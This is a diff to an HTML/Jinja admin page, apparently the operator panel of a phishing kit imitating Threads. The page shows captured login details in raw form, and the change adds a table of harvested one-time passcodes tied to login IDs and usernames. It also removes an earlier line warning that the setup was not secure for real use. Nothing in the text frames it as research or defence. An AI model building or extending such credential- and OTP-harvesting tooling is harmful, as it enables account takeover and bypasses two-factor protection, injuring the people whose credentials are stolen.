@@ -2,15 +2,17 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <title>Admin – Threads Logins</title>
+    <title>Admin – Threads Logins and OTPs</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
 </head>
 <body>
 <div class="container">
     <div class="card admin-card">
         <h1 class="title">Admin Panel</h1>
-        <p class="subtitle">All stored login details (raw – not secure for real use).</p>
+        <p class="subtitle">All stored login details (raw) and OTPs.</p>
 
+        <h2>Logins</h2>
         <table class="db-table">
             <thead>
             <tr>
@@ -29,9 +31,33 @@
                     <td>{{ row[3] }}</td>
                 </tr>
             {% else %}
+                <tr><td colspan="4" style="text-align:center;">No login records yet.</td></tr>
+            {% endfor %}
+            </tbody>
+        </table>
+
+        <h2 style="margin-top:18px;">OTPs</h2>
+        <table class="db-table">
+            <thead>
+            <tr>
+                <th>OTP ID</th>
+                <th>Login ID</th>
+                <th>Username</th>
+                <th>OTP</th>
+                <th>Created At</th>
+            </tr>
+            </thead>
+            <tbody>
+            {% for row in otps %}
                 <tr>
-                    <td colspan="4" style="text-align:center;">No records yet.</td>
+                    <td>{{ row[0] }}</td>
+                    <td>{{ row[1] }}</td>
+                    <td>{{ row[4] or '-' }}</td>
+                    <td>{{ row[2] }}</td>
+                    <td>{{ row[3] }}</td>
                 </tr>
+            {% else %}
+                <tr><td colspan="5" style="text-align:center;">No OTPs yet.</td></tr>
             {% endfor %}
             </tbody>
         </table>
